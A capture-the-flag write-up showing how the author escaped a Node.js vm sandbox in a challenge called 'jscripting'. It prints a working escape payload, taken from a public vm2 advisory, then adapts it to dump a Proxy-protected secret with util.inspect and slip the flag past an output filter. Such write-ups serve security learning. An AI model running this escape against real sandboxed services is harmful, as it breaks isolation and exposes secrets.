# jscripting

tl;dr: use `util.inspect` to see protected attributes of `Proxy` object

## problem

see [web_jscripting.7z](./web_jscripting.7z)

## solution

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/7ba47fbb-7e60-43cb-bc55-6680c6c641bb)

on the backend, we execute our code in a node js `vm`

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/eb02281e-9ad5-4bdf-9a96-7c494fa99836)

i got a payload from @oh_word on the cyberspace team, and he got it from [https://security.snyk.io/vuln/SNYK-JS-VM2-5537100](https://security.snyk.io/vuln/SNYK-JS-VM2-5537100)

example payload to get access to `globalThis`
```js
(() => {const err = new Error();err.name = {toString: new Proxy(() => "", {apply(target, thiz, args) {const process = args.constructor.constructor("return globalThis")();throw process;},}),};try{err.stack;}catch(e){
  return e;  // this is where the magic happens (what is returned here we can see)
}})()
```

this allows us to escape the vm and get access to the `globalThis` object in the worker_globals.js file (shown below)

```js
globalThis.module = module;

const secret = process.env["SECRET"];
const flag = process.env["FLAG"];

globalThis.storage = new Proxy({ secret },
{
    get: (target, name) => {
        if (name == "secret") {
            return null;
        }

        return target[name];
    },

    getOwnPropertyDescriptor: (target, name) => {
        if (name == "secret") {
            return {
                value: flag,
                writable: true,
                enumerable: true,
                configurable: true,
            };
        }

        return target[name];
    }
});
```

the `globalThis` object is also modified in worker.js (modified in worker.js before the vm executes our payload)

```js
const moduleRequire = globalThis.module.require;
globalThis.module.require = (id) => {
    const whitelist = [
        "crypto",
        "path",
        "buffer",
        "util",
        "worker_threads",
        "stream",
        "string_decoder",
        "console",
        "perf_hooks"
    ];

    if (!whitelist.some(p => id == p))
        return;
    
    return moduleRequire(id);
}
```

as you can see, the globalThis has a storage which has the `flag` (fake flag!!!) and a `secret`. the secret is the real flag, but we cant view it because it is hidden behind a proxy object

one idea i had was to do `new globalThis.module.require('buffer').allocUnsafe(2000)` (similar to [here](https://snyk.io/blog/exploiting-buffer/)) to leak memory, but this did not leak anything useful

we have access to the `util`, which is very interesting.

interestingly, we have `util.inspect` (see [here](https://nodejs.org/docs/latest/api/util.html#utilinspectobject-options))

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/791ba068-93eb-4c33-a701-c8147d29e06a)

putting this into our payload template to try to inspect storage:
```js
(() => {const err = new Error();err.name = {toString: new Proxy(() => "", {apply(target, thiz, args) {const process = args.constructor.constructor("return globalThis")();throw process;},}),};try{err.stack;}catch(e){
  return e.module.require('util').inspect(e.storage);
}})()
```

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/7398397e-68c5-41f1-8f5d-30c0814dd454)

what !?

well, there is a check to not print out flags

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/0cef9ce6-1002-4db3-86a4-166186d03dc3)

so i can just convert this to a list by doing `[...str]` to make it `['c','r','3','{', etc, '}']`

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/d4e3f02f-58da-499b-ad84-0d6cc0972de7)

this outputted the flag
